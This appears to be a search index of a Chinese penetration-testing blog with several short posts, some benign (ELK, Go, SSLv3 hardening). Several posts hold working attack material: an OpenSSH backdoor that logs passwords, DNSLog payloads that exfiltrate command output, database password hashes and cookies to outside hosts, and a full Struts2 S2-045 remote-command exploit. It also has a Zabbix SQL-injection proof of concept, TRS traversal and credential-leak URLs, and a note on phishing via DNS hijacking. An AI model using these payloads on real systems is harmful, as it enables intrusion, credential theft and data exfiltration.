<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[重编译OpebSSH记录登录密码]]></title>
    <url>%2F2018%2F03%2F12%2F%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器OpenSSH 源码下载地址 编辑 auth-passwd.c 文件，在 auth_password 函数中添加： 1logit("username: %s password: %s", authctxt-&gt;user, password); 重新编译安装： 12./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/manmake &amp;&amp; make install 有些环境在编译的时候会报缺少xx头文件的错，安装对应的库就可以了，比如缺少 zlib.h 1apt install libssl-dev libz-dev 查看记录的登录密码 1cat /var/log/auth.log]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向破解学习]]></title>
    <url>%2F2018%2F03%2F06%2F%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[学习最艰难的是走出第一步 查壳PEiD： 查看入口点，即程序的入口地址 查看软件加的什么壳 调试器OllyDbg: 参考资料看雪工具看雪知识库吾爱破解工具包]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用ELK技术栈做日志审计]]></title>
    <url>%2F2018%2F02%2F28%2F%E4%BD%BF%E7%94%A8ELK%E6%8A%80%E6%9C%AF%E6%A0%88%E5%81%9A%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[ELK 技术栈(即Logstash + ElasticSearch + Kibana)属于业界已经应用比较广泛且成熟的开源方案，这套一站式解决方案基本上可以满足大部分企业对日志管理体系的需求。 12curl -XDELETE '127.0.0.1:9200/*'curl 'localhost:9200/_cat/indices?v' 12345678910111213141516171819202122232425262728293031input &#123; beats &#123; port =&gt; 5044 &#125;&#125;filter &#123; if "bvip_nginx_access" in [fields][log_source] &#123; grok &#123; match =&gt; ["message", "%&#123;COMBINEDAPACHELOG&#125;"] &#125; &#125;geoip &#123; source =&gt; "clientip" target =&gt; "geoip" database =&gt; "/home/zhangjf/ELK/logstash-6.2.2/GeoLite2-City.mmdb" add_field =&gt; [ "[geoip][coordinates]", "%&#123;[geoip][longitude]&#125;" ] add_field =&gt; [ "[geoip][coordinates]", "%&#123;[geoip][latitude]&#125;" ] &#125;mutate &#123; convert =&gt; [ "[geoip][coordinates]", "float" ] &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [ "127.0.0.1:9200" ] index =&gt; "logstash-%&#123;[fields][log_source]&#125;-%&#123;+YYYY.MM.dd&#125;" &#125; stdout &#123;codec =&gt; rubydebug&#125;&#125; 12345678910paths: - "/home/elk/nginx/1.log"fields: log_source: bvip_nginx_accesspaths: - /home/elk/apache/*.logfields: log_source: bvip_apache_access`]]></content>
      <tags>
        <tag>tools</tag>
        <tag>ELKF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[笔记]]></title>
    <url>%2F2018%2F02%2F09%2F%E4%B8%80%E4%BA%9BTips%2F</url>
    <content type="text"><![CDATA[记录一些容易忘的东西 修改真实IPBurp Suite –&gt; Options –&gt; Match adn Replace –&gt; Add 12345678910HTTP-CLIENT-IP: &lt;script&gt;alert('XSS')&lt;/script&gt;HTTP-FORWARDED-FOR: &lt;script&gt;alert('XSS')&lt;/script&gt;Client-IP: &lt;script&gt;alert('XSS')&lt;/script&gt;HTTP-X-FORWARDED-FOR: 127.0.0.1HTTP-X-FORWARDED: 127.0.0.1HTTP-X-CLUSTER-CLIENT-IP: 127.0.0.1HTTP-FORWARDED-FOR: 127.0.0.1HTTP-FORWARDED: 127.0.0.1REMOTE-ADDR: 127.0.0.1HTTP-VIA: 127.0.0.1 Vbox共享文件夹没有权限访问报错：This location could not be displayed. You do not have the permissionsnecessary to view the contents. 12sudo usermod -a -G vboxsf usernamereboot S3 Bucket12sudo pip install aws-shellaws s3 ls s3://flaws.cloud.s3.amazonaws.com --no-sign-request]]></content>
      <tags>
        <tag>Tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go 语言学习]]></title>
    <url>%2F2018%2F02%2F01%2FGo-%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[往期写东西都是总结性的,很少记录学习过程,近期接触了Go语言,开始记录学习Go的过程. Go 语言环境安装下载Golang官网，居然可以访问google.cn!下载界面获取对应操作系统源码包 1wget https://dl.google.com/go/go1.9.3.linux-amd64.tar.gz 安装123sudo tar -zxvf go1.9.3.linux-amd64.tar.gz -C /usr/local/export PATH=$PATH:/usr/local/go/bingo version 添加环境变量12345678####GO####export GOROOT=/usr/local/go#GOPATHexport GOPATH=/home/jeffzhang/Projects/go_workspace#GOROOT BINexport PATH=$PATH:$GOROOT/bin#GOPATH BINexport PATH=$PATH:$GOPATH/bin 安装 golang.org 中的包12mkdir $GOPATH/src/golang.org/x/ &amp;&amp; cd $GOPATH/src/golang.org/x/git clone https://github.com/golang/tools.git 年轻人第一个 Go 程序Hello WordGoland 提供了在线练习环境https://play.golang.org/ 123456package mainimport "fmt"func main() &#123; fmt.Println("Hello, World!")&#125; 很简单的程序,运行会打印出Hello, World!代码分三块: 第一部分package main定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 第二块import &quot;fmt&quot;告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数。 第三块func main()是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） 运行 Go 程序Goland 提供了在线练习环境可以直接运行程序,本次使用需要依赖Goland环境 将代码保存为test.go 打开命令行，并进入程序文件保存的目录中 输入命令go run test.go并按回车执行代码 不记了，一把梭子干到底，直接写代码]]></content>
      <tags>
        <tag>G</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shodan调用接口查询]]></title>
    <url>%2F2018%2F01%2F19%2FShodan%E8%B0%83%E7%94%A8%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[Shodan是一个搜索引擎，但它与Google这种搜索网址的搜索引擎不同，Shodan是用来搜索网络空间中在线设备的，安全人员可以通过Shodan搜索指定的设备，或者搜索特定类型的设备最近测试要频繁的收集一些特定的网络设备，写个Python自动获取，Shodan官方提供了Python接口调用模块，只需要调用就可以了官方接口文档 官方Python库地址代码： 1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author : jeffzhang# @Time : 2018/01/12# @File : shodan_search_api.py# @Desc : ""import shodanAPI_KEY = ""Shodan_API = shodan.Shodan(API_KEY)query = raw_input("Enter search query: ")try: results = Shodan_API.search(query) for result in results['matches']: with open("shodan_" + query + ".dict", "a+") as result_output: result_output.write(str(result['ip_str']) + ":" + str(result['port']) + "\n") print 'IP: %s' % result['ip_str'], result['port'] # print result['data'] # print '' print 'Results found: %s' % results['total']except shodan.APIError as e: print 'Error: %s' % e 1234567891011121314151617181920212223242526272829#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author : jeffzhang# @Time : 2018/01/30# @File : _shodan.py# @Desc : "默认查询500条结果"import requestsdef search_shodan(search_query, api_key): for page in range(1, 6): try: req_url = "https://api.shodan.io/shodan/host/search?key=%s&amp;query=%s&amp;page=%s" % (api_key, search_query, page) respond = requests.get(req_url) for result in respond.json()['matches']: ip_str = result['ip_str'] port = result['port'] location = result["location"]["country_name"] + "," + str(result["location"]["city"]) print(ip_str, port, location) except Exception as e: print(e)if __name__ == "__main__": API_KEY = "" s_query = "weblogic country:CN" search_shodan(s_query, API_KEY)]]></content>
      <tags>
        <tag>Shodan</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNSLog使用]]></title>
    <url>%2F2018%2F01%2F19%2FDNSLog%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[通过监测DNS解析和HTTP访问记录，来展现执行结果，在检测盲注类漏洞或没有回显的命令执行等漏洞时有着非常重要的作用 1ping `whoami`.target.ping.rce.dns.ga 1SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.target.sql.dns.ga',80) FROM DUAL; 1SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'target.sql.dns.ga\\abc')); 1curl "http://target.rce.dns.ga/`whoami`" 1wget "http://target.rce.dns.ga/`id`" 123var s=document.createElement('img');s.src="http://target.xss.dns.ga/?xss="+document.location+"&amp;cookie="+document.cookie;document.head.appendChild(s);]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>DNSLog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MS17-010批量检测]]></title>
    <url>%2F2017%2F12%2F09%2FMS17-010%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[客户内网有套系统用到了很多Windows系统，记录一下使用Metasploit批量检测方法 主机探测服务器较多，加上都是批量上的默认配置，所以先用nmap扫描开放445端口的主机，然后对这些开了端口的服务做扫描。 12msfconsoledb_nmap -sT -T4 10.88.32.0/24 -p 445 --open 扫描的结果会存储在数据库里，在接下来的MS17-010漏洞扫描模块里中直接调用,注意扫描端口之前最好host -d清除之前的数据 漏洞探测Metasploit扫描模块已经更新了，如果没有的话msfupdate一下 123use auxiliary/scanner/smb/smb_ms17_010hosts -Rexploit 这边hosts的-R参数是将数据库的host作为扫描模块的RHOSTS参数引入 漏洞利用漏洞利用模块在exploit/windows/smb/ms17_010_eternalblue]]></content>
      <tags>
        <tag>Vulnerability</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSLv3协议漏洞修复]]></title>
    <url>%2F2017%2F11%2F08%2FSSLv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[最近扫描发现各种各样的SSLv3协议漏洞，记录一下修复方式 漏洞简介SSLv3漏洞（CVE-2014-3566），该漏洞贯穿于所有的SSLv3版本中，利用该漏洞，黑客可以通过中间人攻击等类似的方式(只要劫持到的数据加密两端均使用SSL3.0)，便可以成功获取到传输数据(例如cookies)。针对此漏洞，需要服务器端和客户端均停用SSLv3协议。 漏洞验证测试某一系统是否支持SSLv3，可使用OpenSSL命令，如下所示： 1openssl s_client -ssl3 -connect google.com:443 正常返回内容 1234567891011121314151617181920212223CONNECTED(00000003)depth=2 /C=US/O=GeoTrust Inc./CN=GeoTrust Global CAverify error:num=20:unable to get local issuer certificateverify return:0---Certificate chain--- Certificate details removed for brevity ------New, TLSv1/SSLv3, Cipher is RC4-SHAServer public key is 2048 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONESSL-Session: Protocol : SSLv3 Cipher : RC4-SHA Session-ID: 6E461AEAD8C1516F9D8950A9B5E735F9882BFC6EA0838D81CFD41C01A3799A41 Session-ID-ctx: Master-Key: 7E7680640BB7E2C83CBE87342727E0D09AC10EEEB095A8C0A2501EAE80FA1C20D3F3FE4346B1234057D6D506420273FA Key-Arg : None Start Time: 1421296281 Timeout : 7200 (sec) Verify return code: 0 (ok) 发生握手失败错误表明并不支持使用SSLv3，并且服务器并不存在漏洞（用于进行POODLE攻击。) 1139990104422040:error:140A90C4:SSL routines:SSL_CTX_new:null ssl method passed:ssl_lib.c:1878: 修复方式Nginx修该配置文件只允许TLS协议 12345ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_prefer_server_ciphers on;ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!eNULL:!EXPORT:!DES:!3DES:!MD5:!DSS:!PKS;ssl_session_timeout 5m;ssl_session_cache builtin:1000 shared:SSL:10m; Apache修改配置文件禁用SSLv3协议 123SSLProtocol all -SSLv2 -SSLv3SSLHonorCipherOrder onSSLCipherSuite ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!MD5:!DSS IIS请参考：http://support2.microsoft.com/kb/187498/en-us或：http://support2.microsoft.com/kb/187498/zh-cn进行手工修复，或者使用fix it向导进行修复。修改完后，Linux重启Web服务即可，Windwos需要重新启动计算机。]]></content>
  </entry>
  <entry>
    <title><![CDATA[RSAS使用VPN代理]]></title>
    <url>%2F2017%2F10%2F19%2FRSAS%E4%BD%BF%E7%94%A8VPN%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[RSAS是绿盟的漏洞扫描器，用是挺好用的就是不支持VPN，客户系统大多做了网络隔离的，只能VPN访问，但方法还是有的，先用Windows拨VPN，然后利用Windows的Internet网络连接共享功能来做跳板进行扫描。 使用电脑无线网卡连接WiFi 使用VPN软件连接VPN 打开网络适配器，右键VPN的虚拟网卡 点击属性，打开共享 在internet连接共享里勾选允许，并选择电脑有线网卡 网线与扫描器直连 扫描器网络配置里IP配置为192.168.137.2，子网掩码为24位，网关为192.168.137.1 尝试扫描器ping一下要扫描的对象]]></content>
      <tags>
        <tag>Scan</tag>
        <tag>RASA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2-045命令执行漏洞]]></title>
    <url>%2F2017%2F09%2F28%2FStruts2-045%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品：Struts1和Struts2，ApacheStruts 2.3.5–2.3.31版本及2.5–2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638） 漏洞简介该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令 漏洞危害攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi、debug等功能）以及启用任何插件，因此漏洞危害较为严重。 修复措施目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。 自查方式用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar文件如果这个版本在Struts2.3.5到Struts2.3.31以及Struts2.5到Struts2.5.10之间则存在漏洞。 升级修复受影响用户可升级版本至Apache Struts 2.3.32或Apache Struts 2.5.10.1以消除漏洞影响。删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 检测代码12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/python# -*- coding: utf-8 -*-import urllib2import httplibdef exploit(url, cmd): payload = "Content-Type:%&#123;(#_='multipart/form-data')." payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." payload += "(#_memberAccess?" payload += "(#_memberAccess=#dm):" payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." payload += "(#ognlUtil.getExcludedPackageNames().clear())." payload += "(#ognlUtil.getExcludedClasses().clear())." payload += "(#context.setMemberAccess(#dm))))." payload += "(#cmd='%s')." % cmd payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." payload += "(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;))." payload += "(#p=new java.lang.ProcessBuilder(#cmds))." payload += "(#p.redirectErrorStream(true)).(#process=#p.start())." payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." payload += "(#ros.flush())&#125;" try: headers = &#123;'User-Agent': 'Mozilla/5.0', 'Content-Type': payload&#125; request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return pageif __name__ == '__main__': import sys if len(sys.argv) != 3: print("[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;") else: print('[*] CVE: 2017-5638 - Apache Struts2 S2-045') url = sys.argv[1] cmd = sys.argv[2] print("[*] cmd: %s\n" % cmd) exploit(url, cmd)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Zabbix注入漏洞]]></title>
    <url>%2F2017%2F08%2F26%2FZabbix%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Zabbix 是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 漏洞简介Zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆Zabbix管理系统，也可通过script等功能轻易直接获取Zabbix服务器的操作系统权限。但是无需登录注入这里有个前提，就是Zabbix开启了guest权限。而在Zabbix中，guest的默认密码为空，需要有这个条件的支持才可以进行无权限注入 漏洞利用Payload1http://127.0.0.1/zabbix/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17 利用代码代码基于Pocsuite框架 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env python# -*- coding: utf-8 -*-from pocsuite.api.request import reqfrom pocsuite.api.poc import registerfrom pocsuite.api.poc import Output, POCBaseclass TestPOC(POCBase): vulID = '00004' version = '1' author = 'jeffzhang' vulDate = '2017-08-26' createDate = '2017-08-26' updateDate = '2017-08-26' references = ['http://www.freebuf.com/vuls/112197.html'] name = 'Zabbix SQl 注入漏洞 PoC' appPowerLink = 'https://www.zabbix.com' appName = 'Zabbix' appVersion = '3.0.3' vulType = 'SQL Injection' desc = ''' Zabbix 2.2.x和3.0.x版本中存在两处基于错误回显的SQL注入漏洞 ''' samples = ['http://89.239.138.140:5001/'] def _verify(self): result = &#123;&#125; payload = payload = "/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1" att_url = self.url + payload response = req.get(att_url) if "You have an error in your SQL syntax" in response.content: result['VerifyInfo'] = &#123;&#125; result['VerifyInfo']['URL'] = self.url result['VerifyInfo']['Payload'] = payload return self.parse_attack(result) def _attack(self): return self._verify() def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail('Internet noting return') return outputregister(TestPOC)]]></content>
      <tags>
        <tag>Vulnerability</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TRS漏洞整理]]></title>
    <url>%2F2017%2F06%2F22%2FTRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下 WCM内容管理系统WCM5.2~WCM6.5存在SQL注入首先是这个页面，http://xx.xx.xx/portal/db/dbupdatelog_list.jsp直接注入 12http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/set/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/where/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOGhttp://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/set/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/where/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOG 注：存在注入参数为:OrderType和OrderField WCM任意文件下载漏洞漏洞存在于wcm/app/system/read_image.jsp读取上传图片功能处，可构造链接下载任意文件，列如 1http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml 读取tomcat配置文件 WCM6.x系列用户密码泄漏TRS WCM 6.0以上版本某个功能页面调用service限制不严格，可以获取后台管理用户的用户名和密码序列。访问链接： 1HTTP://xx.xx.xx/wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getOnlineUsers WCM的密码加密方式是：常规32位MD5取前15位;如果只访问wcm/infoview.do，尽管是个错误页面，比如：首先访问 1http://xx.xx.xx/wcm/infoview.do 然后你再访问： 1http://xx.xx.xx/wcm WCM用户注册逻辑漏洞问题出在wcm/console/auth/reg_newuser.jsp文件中即将随意表单改成STATUS值为30，或增加STATUS字段表单。然后提交注册虽然说是“请等待开通！”，但实际上已经开通了，因为STATUS字段已经改成正常了。直接登陆虽然没什么权限，但后台存在大量注入等漏洞可以通过注入直接操作数据库了。 1http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx WCM6权限绕过首先访问wcm目录，会自动跳转到登录页面在网址后加上查看管理员密码的链接： 1wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getUsersByNames&amp;UserNames=admin 之前的漏洞说查看管理员信息的危害不大是因为MD5加密只取半截，并且即使破解还有可能遇到admin账号未启用的问题这时我们点击浏览器的后退按钮或在地址栏的网址后面直接输入wcm/app/login.jsp，这样就绕过权限登录了 WCM全版本任意文件写入漏洞这个是16年年初出的漏洞，当初协助北京公司做过一次排查。是利用webservices的importDocuments接口匿名访问，加上畸形文件名进行利用，Exp下载 IDS身份管理系统IDS系统任意文件读取和信息泄露漏洞漏洞文件路径在admin/debug/目录下，读取文件为fv.jsp，信息泄露为env.jsp等，直接访问文件即可 XXE漏洞使用DNS Log进行记录 123456789101112POST /ids/service?idsServiceType=jitSyncUser HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**X-Forwarded-For: **.**.**.**Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------1988224119974Content-Length: 196]&gt;&amp;xxe; 参考资料 WAS文本检索系统WAS未授权访问安装目录下was40/tree文件可以看到一些后台功能访问was40/passwd/passwd.htm输入一个不存在的用户名会暴露出服务器内网IP地址 同时存在暴力破解用户密码的可能性 未授权发布信息编辑信息的时候未对提交的数据进行过滤，同时存在未对用户是否登录进行验证 WAS任意文件读取问题出在/was5/web/tree文件下，构造路径可以任意读取文件，这个就创宇提的那个漏洞 1http://xx.xx.xx/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties WAS任意文件下载漏洞问题出在was5/admin/template/download_templet.jsp文件下，构造type参数的值可以任意下载文件， 1http://xx.xx.xx/was5/admin/template/download_templet.jsp?type=../web/tagscloud WAS任意文件写入漏洞文件是was5/admin/template/customize/detailcustomize,构造template的参数值进行任意文件写入同理还有一个问题文件/was5/admin/template/customize/outlinecustomize，利用方式一样]]></content>
      <tags>
        <tag>Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配和DNS劫持钓鱼]]></title>
    <url>%2F2017%2F03%2F24%2FNginx%E9%85%8D%E5%92%8CDNS%E5%8A%AB%E6%8C%81%E9%92%93%E9%B1%BC%2F</url>
    <content type="text"><![CDATA[最近有个项目用到Nginx服务器，用了一段时间发现Nginx的反向代理功能配合DNS劫持有奇效，记录一下过程跟一些技巧 Nginx搭建搭建Nginx我用的OpenResty，OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，内部集成了很多好用的 Lua 库、第三方模块以及大多数的依赖项。 下载源码官网下载最新源码 1wget https://openresty.org/download/openresty-1.11.2.3.tar.gz 还有个第三方的库ngx_http_substitutions_filter_module这个就是我们用来替换字符的后面会用到 安装Ubuntu需要一些开发库 1apt-get install libreadline-dev libncurses5-dev libpcre3-dev libssl-dev perl make build-essential 然后开始编译 12345tar -xzvf openresty-VERSION.tar.gzcd openresty-VERSION/./configure --with-http_ssl_module //这里可以加一些参数，比如--prefix=/opt/openresty指定安装目录，--add-module添加第三方模块等，可以./configure --help 查看更多的选项makesudo make install 启动及关闭先建立一个快捷方式 1sudo ln -s /usr/local/openresty/nginx/sbin/nginx /usr/local/bin/nginx 启动1nginx 关闭12nginx -s stopor pkill nginx 重启1nginx -s reload Nginx配置Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。 main部分设置的指令将影响其它所有部分的设置； server部分的指令主要用于指定虚拟主机域名、IP和端口； upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡； location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。 他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 邮箱劫持配置邮箱劫持的话呢要用到Nginx的反向代理了，关于Nginx配置文件介绍很多，就不摘了直接上配置文件了Nginx主配置文件在/usr/local/openresty/nginx/conf/nginx.conf不过我习惯在conf目录下面建立文件夹把server主机配置单独放置，然后在nginx.conf主配置文件里include]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ProcessOn在线作图]]></title>
    <url>%2F2016%2F09%2F30%2FProcessOn%E5%9C%A8%E7%BA%BF%E4%BD%9C%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[ProcessOn是一个方便易用、免费高效的在线作图工具，运用它可以免费制作多种图，例如：Flowchart流程图，BPMN图，Org组织结构图，EVC企业价值链图，EPC事件过程链图，网络拓扑图等网址 账号：jeffzhang@yopmail.com密码：]]></content>
      <tags>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux提权漏洞整合]]></title>
    <url>%2F2016%2F09%2F23%2FLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[记录一些经常用到的Linux提权漏洞 Linux内核竞争条件漏洞（CVE-2016-8655）代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514/*chocobo_root.clinux AF_PACKET race condition exploitexploit for Ubuntu 16.04 x86_64vroom vroom*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=user@ubuntu:~$ uname -aLinux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxuser@ubuntu:~$ iduid=1000(user) gid=1000(user) groups=1000(user)user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthreaduser@ubuntu:~$ ./chocobo_rootlinux AF_PACKET race condition exploit by rebelkernel version: 4.4.0-51-generic #72proc_dostring = 0xffffffff81088090modprobe_path = 0xffffffff81e48f80register_sysctl_table = 0xffffffff812879a0set_memory_rw = 0xffffffff8106f320exploit startingmaking vsyscall page writable..new exploit attempt starting, jumping to 0xffffffff8106f320, 